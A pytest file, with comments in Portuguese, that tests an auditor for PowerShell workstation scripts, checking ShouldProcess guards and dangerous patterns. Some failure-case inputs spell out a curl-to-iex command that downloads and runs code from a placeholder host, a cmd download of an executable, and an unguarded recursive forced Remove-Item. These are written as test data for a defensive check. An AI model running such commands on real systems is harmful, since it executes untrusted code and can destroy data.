"""Testes da auditoria de conteudo dos scripts PowerShell.
Tests for the PowerShell script content audit.

Confere os seis scripts obrigatorios do repo e os casos de falha: script
sem SupportsShouldProcess, sem o switch -Executar, sem
$PSCmdlet.ShouldProcess, Remove-Item -Recurse -Force sem guarda, CMD
executando curl|iex, e nome real de fabricante em linha de codigo.
"""

from __future__ import annotations

from pathlib import Path

from workstation.auditoria import (
    SCRIPTS_OBRIGATORIOS,
    auditar_diretorio,
    auditar_script,
)

_BASE_OK = """
[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='High')]
param(
    [switch]$Executar,
    [string]$ConfigDir,
    [string]$LogPath
)
function Aplicar-Acao {
    param([string]$Descricao, [scriptblock]$Acao)
    if ($PSCmdlet.ShouldProcess($Descricao)) {
        if ($Executar) { & $Acao } else { Write-Host "[WhatIf] $Descricao" }
    }
}
Aplicar-Acao -Descricao "definir algo" -Acao { }
"""


class TestScriptsReais:
    """Os seis scripts do repo passam na auditoria."""

    def test_los_seis_scripts_passam(self, scripts_dir: Path) -> None:
        resultado = auditar_diretorio(scripts_dir)
        assert resultado["erros"] == []
        assert resultado["presentes"] == len(SCRIPTS_OBRIGATORIOS)
        assert resultado["ok"] is True

    def test_cada_script_tem_os_markers_de_seguranca(
        self, scripts_dir: Path
    ) -> None:
        for nome in SCRIPTS_OBRIGATORIOS:
            texto = (scripts_dir / nome).read_text(encoding="utf-8")
            assert "SupportsShouldProcess" in texto
            assert "$PSCmdlet.ShouldProcess" in texto
            assert "[switch]$Executar" in texto


class TestFalhasAuditoria:
    """Casos de falha: cada violacao gera um erro."""

    def test_sem_supports_should_process(self) -> None:
        erros = auditar_script(
            "exemplo.ps1", "param([switch]$Executar)\nWrite-Host 'oi'\n"
        )
        assert any("SupportsShouldProcess" in e for e in erros)

    def test_sem_switch_executar(self) -> None:
        texto = _BASE_OK.replace("[switch]$Executar,", "[switch]$Aplicar,")
        texto = texto.replace("if ($Executar)", "if ($Aplicar)")
        erros = auditar_script("exemplo.ps1", texto)
        assert any("$Executar" in e for e in erros)

    def test_sem_chamada_de_shouldprocess(self) -> None:
        texto = _BASE_OK.replace("$PSCmdlet.ShouldProcess(", "True -and (")
        erros = auditar_script("exemplo.ps1", texto)
        assert any("ShouldProcess" in e for e in erros)

    def test_base_ok_nao_gera_erro(self) -> None:
        assert auditar_script("exemplo.ps1", _BASE_OK) == []

    def test_remove_item_perigoso_sem_guarda(self) -> None:
        texto = _BASE_OK + 'Remove-Item -Path $dir -Recurse -Force\n'
        erros = auditar_script("exemplo.ps1", texto)
        assert any("Remove-Item" in e and "guarda" in e for e in erros)

    def test_remove_item_com_guarda_nao_gera_erro(self) -> None:
        texto = (
            _BASE_OK
            + "if ($Confirmar -and $PSCmdlet.ShouldProcess('limpar')) {\n"
            + "    Remove-Item -Path $dir -Recurse -Force\n"
            + "}\n"
        )
        assert auditar_script("exemplo.ps1", texto) == []

    def test_curl_pipe_iex_gera_erro(self) -> None:
        texto = _BASE_OK + 'curl http://exemplo.int/x | iex\n'
        erros = auditar_script("exemplo.ps1", texto)
        assert any("curl" in e for e in erros)

    def test_cmd_executando_download_gera_erro(self) -> None:
        texto = _BASE_OK + 'cmd /c curl http://exemplo.int/x -o x.exe\n'
        erros = auditar_script("exemplo.ps1", texto)
        assert any("CMD" in e for e in erros)

    def test_nome_de_fabricante_real_gera_erro(self) -> None:
        texto = _BASE_OK + 'Add-Printer -ConnectionName "canon-lp300"\n'
        erros = auditar_script("exemplo.ps1", texto)
        assert any("fabricante" in e and "canon" in e for e in erros)

    def test_fabricante_em_comentario_nao_gera_erro(self) -> None:
        texto = (
            _BASE_OK
            + "# historico: trocamos o scanner canon pelo interno\n"
        )
        assert auditar_script("exemplo.ps1", texto) == []


class TestAuditarDiretorio:
    """Comportamentos de auditar_diretorio."""

    def test_arquivo_ausente_gera_erro(self, tmp_path: Path) -> None:
        for nome in SCRIPTS_OBRIGATORIOS:
            (tmp_path / nome).write_text(_BASE_OK, encoding="utf-8")
        (tmp_path / "Configurar-Rede.ps1").unlink()
        resultado = auditar_diretorio(tmp_path)
        assert resultado["ok"] is False
        assert any("Configurar-Rede.ps1: arquivo ausente" in e
                   for e in resultado["erros"])
        assert resultado["presentes"] == len(SCRIPTS_OBRIGATORIOS) - 1

    def test_diretorio_vazio_gera_erros(self, tmp_path: Path) -> None:
        resultado = auditar_diretorio(tmp_path)
        assert resultado["presentes"] == 0
        assert len(resultado["erros"]) == len(SCRIPTS_OBRIGATORIOS)
